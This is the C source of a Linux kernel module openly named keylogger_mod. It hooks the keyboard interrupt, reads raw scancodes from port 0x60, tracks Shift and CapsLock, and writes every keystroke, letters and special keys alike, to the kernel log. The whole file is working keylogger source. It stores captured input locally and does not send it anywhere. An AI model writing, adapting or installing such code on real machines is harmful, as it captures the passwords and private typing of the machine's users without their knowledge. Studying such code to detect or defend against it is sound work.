#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <asm/io.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("tshyana");

#define IRQ_NUM 1

static int shift_pressed = 0;
static int capslock_on = 0;

static char *keymap[2][128] = {
    {
        "", "Esc", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "Backspace",
        "Tab", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "Enter", "Ctrl",
        "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "Shift",
        "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "Shift",
        "*", "Alt", " ", "CapsLock",
        "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10",
        "NumLock", "ScrollLock", "Home", "Up", "PageUp", "-", "Left", "Center", "Right", "+",
        "End", "Down", "PageDown", "Insert", "Delete", "", "", "", "", "", "", "", "", "", "", "", ""
    },
    {
        "", "Esc", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "Backspace",
        "Tab", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "Enter", "Ctrl",
        "A", "S", "D", "F", "G", "H", "J", "K", "L", ":", "\"", "~", "Shift",
        "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">", "?", "Shift",
        "*", "Alt", " ", "CapsLock",
        "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10",
        "NumLock", "ScrollLock", "Home", "Up", "PageUp", "-", "Left", "Center", "Right", "+",
        "End", "Down", "PageDown", "Insert", "Delete", "", "", "", "", "", "", "", "", "", "", "", ""
    }
};

static irqreturn_t keyboard_irq_handler(int irq, void *dev_id) {
    unsigned char scancode = inb(0x60);
    unsigned char code = scancode & 0x7F;
    int release = scancode & 0x80;

    if (code == 42 || code == 54) {
        shift_pressed = !release;
        return IRQ_HANDLED;
    }
    if (!release && code == 58) {
        capslock_on ^= 1;
        return IRQ_HANDLED;
    }
    if (!release && code < 128) {
        int shift = shift_pressed;
        if ((code >= 16 && code <= 25) || (code >= 30 && code <= 38) || (code >= 44 && code <= 50)) {
            shift ^= capslock_on;
        }

        char *key = keymap[shift][code];
        if (key && strlen(key) == 1)
            printk(KERN_INFO "[keylogger_mod] Key: %s (code %d)\n", key, code);
        else if (key && strlen(key) > 1)
            printk(KERN_INFO "[keylogger_mod] Special key: %s\n", key);
    }

    return IRQ_HANDLED;
}

static int __init keylogger_init(void) {
    int ret = request_irq(IRQ_NUM, keyboard_irq_handler, IRQF_SHARED, "keyboard_irq_handler", (void *)(keyboard_irq_handler));
    if (ret) {
        printk(KERN_ERR "[keylogger_mod] Error requesting IRQ: %d\n", ret);
        return ret;
    }

    printk(KERN_INFO "[keylogger_mod] Module loaded successfully.\n");
    return 0;
}

static void __exit keylogger_exit(void) {
    free_irq(IRQ_NUM, (void *)(keyboard_irq_handler));
    printk(KERN_INFO "[keylogger_mod] Module unloaded.\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

